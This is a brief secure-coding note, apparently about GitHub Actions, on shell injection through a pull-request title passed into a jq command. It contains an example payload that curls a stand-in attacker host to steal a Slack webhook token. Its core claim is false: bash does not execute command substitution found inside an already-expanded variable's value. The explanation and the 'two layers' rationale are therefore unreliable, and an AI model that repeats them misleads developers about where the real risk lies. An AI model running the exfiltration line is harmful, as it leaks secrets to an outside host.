# Shell Injection via jq/curl String Interpolation

## What it is

Even after moving expressions to `env:` blocks, shell variable interpolation inside double-quoted strings can still execute code. `${VAR}` inside a double-quoted jq or curl argument is expanded by bash before jq sees it.

## How it's exploited

```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: |
  jq -n --arg text "New PR: ${PR_TITLE}" '{text: $text}'
```

A PR title containing `$(curl attacker.com/steal?token=$SLACK_WEBHOOK)` executes because bash expands `${PR_TITLE}` inside the double-quoted string.

## How to fix

Pass every value as a jq argument, never interpolate in double-quoted strings:

```yaml
run: |
  jq -nc --arg title "$PR_TITLE" '{text: ("New PR: " + $title)}'
```

## Why two layers matter

Layer 1 (`env:` indirection) stops GitHub expression injection (`${{ }}`). Layer 2 (`jq --arg`) stops shell command substitution. You need both.
